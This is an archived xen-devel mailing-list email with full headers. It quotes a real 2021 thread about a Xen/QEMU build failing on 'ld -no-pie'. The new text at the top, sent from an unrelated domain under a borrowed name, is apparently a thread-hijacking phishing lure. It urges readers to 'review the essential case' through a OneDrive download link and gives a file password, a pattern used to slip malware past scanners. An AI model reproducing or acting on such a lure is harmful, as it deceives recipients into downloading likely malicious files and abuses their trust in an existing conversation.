Return-Path: <xen-devel-bounces@lists.xenproject.org>
X-Original-To: lists+xen-devel@lfdr.de
Delivered-To: lists+xen-devel@lfdr.de
Received: from lists.xenproject.org (lists.xenproject.org [192.237.175.120])
	by mail.lfdr.de (Postfix) with ESMTPS id 26EDF4DA993
	for <lists+xen-devel@lfdr.de>; Wed, 16 Mar 2022 06:17:26 +0100 (CET)
Received: from list by lists.xenproject.org with outflank-mailman.290884.493781 (Exim 4.92)
	(envelope-from <xen-devel-bounces@lists.xenproject.org>)
	id 1nUM28-0005F9-Q8; Wed, 16 Mar 2022 05:17:16 +0000
X-Outflank-Mailman: Message body and most headers restored to incoming version
Received: by outflank-mailman (output) from mailman id 290884.493781; Wed, 16 Mar 2022 05:17:16 +0000
Received: from localhost ([127.0.0.1] helo=lists.xenproject.org)
	by lists.xenproject.org with esmtp (Exim 4.92)
	(envelope-from <xen-devel-bounces@lists.xenproject.org>)
	id 1nUM28-0005CM-LK; Wed, 16 Mar 2022 05:17:16 +0000
Received: by outflank-mailman (input) for mailman id 290884;
 Tue, 15 Mar 2022 15:37:00 +0000
Received: from se1-gles-flk1-in.inumbo.com ([94.247.172.50]
 helo=se1-gles-flk1.inumbo.com)
 by lists.xenproject.org with esmtp (Exim 4.92) (envelope-from
 <SRS0=osIu=T2=tricolorindia.com=schroeder.bella@srs-se1.protection.inumbo.net>)
 id 1nU9EK-0008I2-5p
 for xen-devel@lists.xenproject.org; Tue, 15 Mar 2022 15:37:00 +0000
Received: from ger.iws.in (ger.iws.in [159.69.75.76])
 by se1-gles-flk1.inumbo.com (Halon) with ESMTPS
 id bf71d8ef-a475-11ec-853b-5f4723681683;
 Tue, 15 Mar 2022 16:36:57 +0100 (CET)
Received: from [40.77.69.157] (port=45320 helo=ger.iws.in)
 by ger.iws.in with esmtpsa (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
 (Exim 4.94.2) (envelope-from <schroeder.bella@tricolorindia.com>)
 id 1nU9EI-0004ta-07
 for xen-devel@lists.xenproject.org; Tue, 15 Mar 2022 21:06:57 +0530
X-BeenThere: xen-devel@lists.xenproject.org
List-Id: Xen developer discussion <xen-devel.lists.xenproject.org>
List-Unsubscribe: <https://lists.xenproject.org/mailman/options/xen-devel>,
 <mailto:xen-devel-request@lists.xenproject.org?subject=unsubscribe>
List-Post: <mailto:xen-devel@lists.xenproject.org>
List-Help: <mailto:xen-devel-request@lists.xenproject.org?subject=help>
List-Subscribe: <https://lists.xenproject.org/mailman/listinfo/xen-devel>,
 <mailto:xen-devel-request@lists.xenproject.org?subject=subscribe>
Errors-To: xen-devel-bounces@lists.xenproject.org
Precedence: list
Sender: "Xen-devel" <xen-devel-bounces@lists.xenproject.org>
X-Inumbo-ID: bf71d8ef-a475-11ec-853b-5f4723681683
MIME-Version: 1.0
Date: Tue, 15 Mar 2022 07:36:56 -0800
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable
X-Priority: 3 (Normal)
From: "John Simpson via Gcc-help" <schroeder.bella@tricolorindia.com>
To: xen-devel@lists.xenproject.org
Subject: Re: An error due to installation that require binutils package
Message-ID: <xrzpaonrjjnu5m2suek2on7wwa1a8qeu@tricolorindia.com>
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - ger.iws.in
X-AntiAbuse: Original Domain - lists.xenproject.org
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - tricolorindia.com
X-Get-Message-Sender-Via: ger.iws.in: authenticated_id: schroeder.bella@tricolorindia.com
X-Authenticated-Sender: ger.iws.in: schroeder.bella@tricolorindia.com
X-Source: 
X-Source-Args: 
X-Source-Dir: 

<html><head><META http-equiv=3D"Content-Type" content=3D"text/html;charset=
=3Dutf-8"></head><body>Hi again!<br />=0AReview the essential case please:<=
br />=0A<br />=0A<br />=0Ahttps://onedrive.live.com/download?cid=3D7525DC7D=
C7D0C530&amp;resid=3D7525DC7DC7D0C530%21107&amp;authkey=3DAPAIWBtplog6Z2E<b=
r />=0A<br />=0A<br />=0A<br />=0A<br />=0A<br />=0AFile password: E4345<br=
 />
<br />
Hello,

Kindly ask you to have a look at this bug.
Thank you for your replies.

On Mon, Mar 29, 2021 at 7:07 PM George Dunlap <George.Dunlap@citrix.com>
wrote:

> John,
>
> Thanks for your report.  Can you post your bug report
>  ?
>
> The bug is in the compilation of QEMU, which is an external project; so
> it=E2=80=99s possible that we=E2=80=99ll end up having to raise this with=
 that community as
> well.
>
> Thanks,
>  -George Dunlap
>
> > On Mar 28, 2021, at 2:26 PM, John Simpson <> wrote:
> >
> > Hello,
> >
> > Just forwarding this message to you. Can you give some thoughs about
> this? Thanks a lot.
> >
> >
> > ---------- Forwarded message ---------
> > From: Alan Modra <>
> > Date: Sun, Mar 28, 2021 at 2:21 PM
> > Subject: Re: An error due to installation that require binutils package=
=2E
> > To: John Simpson <>
> > Cc: <>
> >
> >
> > On Sun, Mar 28, 2021 at 12:55:23PM +0300, John Simpson via Binutils
> wrote:
> > >   BUILD   pc-bios/optionrom/kvmvapic.img
> > > ld: Error: unable to disambiguate: -no-pie (did you mean --no-pie ?)
> >
> > -no-pie is a gcc option.  Neither -no-pie nor --no-pie is a valid ld
> > option.  The fault lies with whatever passed -no-pie to ld.
> >
> > --
> > Alan Modra
> > Australia Development Lab, IBM
> >
> >
> >
> > ---------- Forwarded message ---------
> > From: Andreas Schwab <>
> > Date: Sun, Mar 28, 2021 at 2:17 PM
> > Subject: Re: An error due to installation that require binutils package=
=2E
> > To: John Simpson via Binutils <>
> > Cc: John Simpson <>
> >
> >
> > Please report that to the xen project.  ld -no-pie doesn't have a usefu=
l
> > meaning.  It used to mean the same as ld -n -o-pie, which sets "-pie" a=
s
> > the output file name.
> >
> > Andreas.
> >
> > --
> > Andreas Schwab,=20
> > GPG Key fingerprint =3D 7578 EB47 D4E5 4D69 2510  2552 DF73 E780 A9DA A=
EC1
> > "And now for something completely different."
> >
> >
> >
> > ---------- Forwarded message ---------
> > From: John Simpson <>
> > Date: Sun, Mar 28, 2021 at 12:55 PM
> > Subject: An error due to installation that require binutils package.
> > To: <>
> >
> >
> > Hello,
> >
> > Recently I got a following error due to installation xen on
> 5.11.6-1-MANJARO kernel:
> >
> >   GEN     target/riscv/trace.c
> >   GEN     target/s390x/trace.c
> >   GEN     target/sparc/trace.c
> >   GEN     util/trace.c
> >   GEN     config-all-devices.mak
> > make[1]: Entering directory
> '/home/username/xen/src/xen-4.14.1/tools/qemu-xen/slirp'
> > make[1]: Nothing to be done for 'all'.
> > make[1]: Leaving directory
> '/home/username/xen/src/xen-4.14.1/tools/qemu-xen/slirp'
> >   BUILD   pc-bios/optionrom/multiboot.img
> >   BUILD   pc-bios/optionrom/linuxboot.img
> >   BUILD   pc-bios/optionrom/linuxboot_dma.img
> >   BUILD   pc-bios/optionrom/kvmvapic.img
> > ld: Error: unable to disambiguate: -no-pie (did you mean --no-pie ?)
> > make[1]: *** [Makefile:53: multiboot.img] Error 1
> > make[1]: *** Waiting for unfinished jobs....
> > ld: Error: unable to disambiguate: -no-pie (did you mean --no-pie ?)
> > make[1]: *** [Makefile:53: linuxboot_dma.img] Error 1
> >   BUILD   pc-bios/optionrom/pvh.img
> > ld: Error: unable to disambiguate: -no-pie (did you mean --no-pie ?)
> > make[1]: *** [Makefile:53: linuxboot.img] Error 1
> > ld: Error: unable to disambiguate: -no-pie (did you mean --no-pie ?)
> > make[1]: *** [Makefile:53: kvmvapic.img] Error 1
> > ld: Error: unable to disambiguate: -no-pie (did you mean --no-pie ?)
> > make[1]: *** [Makefile:50: pvh.img] Error 1
> > make: *** [Makefile:581: pc-bios/optionrom/all] Error 2
> > make: Leaving directory
> '/home/username/xen/src/xen-4.14.1/tools/qemu-xen-build'
> > make[3]: *** [Makefile:218: subdir-all-qemu-xen-dir] Error 2
> > make[3]: Leaving directory '/home/username/xen/src/xen-4.14.1/tools'
> > make[2]: ***
> [/home/username/xen/src/xen-4.14.1/tools/../tools/Rules.mk:235:
> subdirs-install] Error 2
> > make[2]: Leaving directory '/home/username/xen/src/xen-4.14.1/tools'
> > make[1]: *** [Makefile:72: install] Error 2
> > make[1]: Leaving directory '/home/username/xen/src/xen-4.14.1/tools'
> > make: *** [Makefile:134: install-tools] Error 2
> > =3D=3D> ERROR: A failure occurred in build().
> >     Aborting...
> >
> > Currently I have fresh binutils 2.36.1-2 and it seems to me that the
> issue is related to this part of code:
> >
> > github.com/bminor/binutils-gdb/blob/master/ld/lexsup.c#L451
> >
> > It seems to me that this could impact far more users than just me.
> >
>
></body></html>

